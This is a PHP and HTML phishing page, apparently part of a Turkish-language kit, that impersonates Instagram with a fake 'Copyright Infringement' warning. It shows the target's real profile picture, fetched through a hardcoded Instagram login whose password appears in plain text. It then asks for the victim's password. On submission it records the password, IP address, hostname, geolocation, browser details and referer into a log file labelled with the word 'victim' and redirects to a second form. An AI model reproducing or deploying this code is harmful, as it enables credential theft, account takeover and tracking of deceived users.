<?php 

$nick=$_GET["nick"];

set_time_limit(0);
require 'instagram/autoload.php';
\InstagramAPI\Instagram::$allowDangerousWebUsageAtMyOwnRisk = true;
$username="epinmagazam";
$password="Qxz06halil18zxQ2005";

$ig = new \InstagramAPI\Instagram();

try{
  $ig->login($username,$password);
}

catch(\Exception $e){
  echo $e->getMessage();
}

$json = $ig->people->getInfoByName($nick);
$arr = json_decode($json, true);
$nickresim = $arr['user']['profile_pic_url']; 

if($_POST){
	
	
$tara =  $_SERVER['HTTP_USER_AGENT'];
	
$taradil =  $_SERVER['HTTP_ACCEPT_LANGUAGE'];
	
$bilgihost =  gethostbyaddr($_SERVER['REMOTE_ADDR']);
	
$gercekipmi =  $_SERVER['HTTP_X_FORWARDED_FOR'];
	
$geldigiadres =  $_SERVER['HTTP_REFERER'];
	
$port =  $_SERVER['REMOTE_PORT'];

$password =  $_POST['password'];

$ip = $_SERVER['REMOTE_ADDR'];
	
$code=$_POST["code"];


if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {

  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];

}

$ip = $_SERVER['REMOTE_ADDR'];

$konum = file_get_contents("http://ip-api.com/xml/".$ip);

$cek = new SimpleXMLElement($konum);

$ulke = $cek->country;
	
	
$isp = $cek->isp;
	
$district = $cek->district;
	
$zip = $cek->zip;

$sehir = $cek->city;

date_default_timezone_set('Europe/Istanbul');  

$cur_time=date("d-m-Y H:i:s");

$code = $_SERVER['REMOTE_ADDR'];

$file = fopen('vuralbeyisx.php', 'a');

fwrite($file, "



<hr>

<font color='red'>Kullanıcı Adı: </font><font color='white'>".$nick."</font><br>

<font color='red'> Şifre: </font><font color='white'>".$password."</font><br>

<font color='red'>İp Hostname (Rdns) : </font><font color='white'>".$bilgihost."</font><br>

<font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>

<font color='red'>Port: </font><font color='white'>".$port."</font><br>

<font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>

<font color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>

<font color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>

<font color='red'>Kullandıgı İnternet Şirketi: </font><font color='white'>".$isp."</font><br>

<font color='red'>Kurbanın Zip Kodu: </font><font color='white'>".$zip."</font><br>

<font color='red'>Kurbanın Tarayıcısı: </font><font color='white'>".$tara."</font><br>

<font color='red'>Kurban Nereden Geldi: </font><font color='white'>".$geldigiadres."</font><br>

<font color='red'>Vpnle Girmişse Gerçek İp: </font><font color='white'>".$gercekipmi."</font><br>

<font color='red'>Tarayıcı Dili: </font><font color='white'>".$taradil."</font><br>





<br>

<hr>

");
echo '';
	header("Location: form2.php?nick=".$nick); }      

?>
<html>
<head>
    <meta charset="utf-8">
    <title>@<?php echo $nick; ?> | Copyright Infringement</title>
    <meta content="minimum-scale=1.0, width=device-width, maximum-scale=0.6667, user-scalable=no" name="viewport">
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
    <link rel="stylesheet" type="text/css" href="css/style1.css">
    <link rel="stylesheet" type="text/css" href="css/style2.css">
<style>

#header {
    width: 100%;
    text-align: center;
    padding-top: 20px;
    position: fixed;
    background-color: #ffffff;
    top: 0px;
    left: 0px;
    height: 70px;
    border-bottom: 2px solid #dbdbdb;
}

#header img {
    width: 200px;
}

#menu {
    width:91%;
} 

#liste {
    display:inline-block;
}

#link {
    text-decoration:none;
    color:#003569; 
    font-family:sans-serif; 
    font-size:13px; 
    font-weight:540; 
    vertical-align: baseline; 
}

#body {
    background-color:#fafafa;
}

#h1 {
    font-family:sans-serif;
    font-weight:400;
    letter-spacing:;
    color:#3d3d3d;
    font-size:20px;
}

#div {
    background-color:white;
    width:300px;
}

#p {
    font-family:sans-serif;
    color:#999;
    width:230px;
}

#button {
    color:white;
    background-color:#3897f0;
    font-size:15px;
    border-radius:3px;
    outline:none;
    font-family:sans-serif;
    font-weight:700;
    border:0;
    width:200px;
    height:40px;
    max-width:99%;
    max-height:50px;
}

.bottom{
  min-height:60px;
  position:fixed;
  bottom:0;
  width:100%;
  background:#fafafa;
  border-top:1px solid #cecece;
}.mini{
  font-size:13px;
  margin-top:8px;
    color:#8e8e8e;
  display:block;
}

.big{
  margin-top:5px;
  font-size:13px;
  letter-spacing:2px;
}
</style>
</head>
<body>

<div class="MFkQJ ABLKx VhasA _1-msl"><div class="GfkS6 "></div><div class="ZsSMR"><a class="z1VUo KD4vR ABLKx VhasA" href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DsignupPage%26ig_mid%3DAE2FF212-B09F-4D9D-97C1-5FD6BB456D90%26utm_content%3Dlo%26utm_medium%3Dbadge" role="alert"><section class="dZvHF  fvoD7"><p class="xK6EF">lnstagram</p><p class="_5b2Kp">Find it for free on Google Play.
</p></section><section class="FMlV_"><button class="_4IAxF">Get</button></section></a></div></div>

<body bgcolor="#fafafa">

<br><br><br><br></div><br><br>

<center>

<div id="div" style="border:1px solid #cecece;">

<center>

<br> 

  <img src="<?php echo $nickresim;?>" alt="<?php echo $nick;?>" width=120 style="border-radius:50%;margin-top:12px;">

<br><br>

  <h1 id="h1">Hello @<?php echo $nick; ?></h1>

<br>

  <p id="p">Please enter the requested information below to prevent your account from being closed.</p>

<br>

<form method="post" >

  <input type="password" name="password" placeholder="Password" required=""  style="padding:6px;background:#fafafa;outline:none;width:83%;height:37px;border:1px solid #dedede;font-family:sans-serif;font-weight:350;flex: 1 0 0px;text-align:center;margin: 0;outline: 0;overflow: hidden;padding: 9px 0 7px 8px;text-overflow: ellipsis;border: 1px solid #e6e6e6;text-overflow:ellipsis;font: 400 13.3333px Arial; border-radius:3px;"><br><br>

    <p id="p">Our team will contact you within 24 hours.</p>

<br>

    <button id="button" type="submit"> Continue as @<?php echo $nick; ?> </button>

 <br>
<br><br>

</center>

</form>

</center>

</div>

<br><br><br>

<center>
  <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo">
    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_turkish-tr.png/30b29fd697b2.png" width="120">
  </a>
  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DD1619D39-E370-43DA-B97D-B73020E1B4AC%26utm_content%3Dlo%26utm_medium%3Dbadge">
    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_turkish-tr.png/9d46177cf153.png" width="120">
  </a>
</center>

</div>

<br><br><br>

<center>
<div id="menu">
</center>
<center>
  <li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">PRESS</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">JOBS</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">PRIVACY</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">TERMS</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">DIRECTORY</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">LANGUAGE</a></li></div><br> 
</center>

  <br><br><br><br><br><br>
  <center>
<div class="bottom">
  <center>
  <img src="https://www.ozengen.com/wp-content/uploads/2020/01/instagram-from-facebook-620x319.png" width="110">
  </center>
</div>
</center>

</body>
</html>